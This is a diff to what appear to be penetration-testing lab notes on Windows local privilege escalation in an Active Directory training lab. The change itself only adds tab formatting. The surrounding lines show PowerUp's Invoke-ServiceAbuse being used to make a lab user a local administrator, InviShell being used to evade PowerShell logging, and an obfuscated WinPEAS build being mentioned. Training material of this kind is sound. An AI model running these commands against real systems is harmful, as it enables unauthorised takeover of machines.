@@ -121,6 +121,7 @@ sc.exe sdshow <servicename>
 ## Local Privilege Escalation using Jenkins - PowerUp
 
 {% tabs %}
+{% tab title="PowerUp.ps1" %}
 
 ```batch
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
@@ -135,6 +136,9 @@ Invoke-AllChecks
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
 ```
 ### We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!
+
+{% endtab %}
+{% endtabs %}
 
 ## Local Privilege Escalation - WinPEAS
 ### You can use WinPEAS using the following command. Note that we use an obfuscated version of WinPEAS:
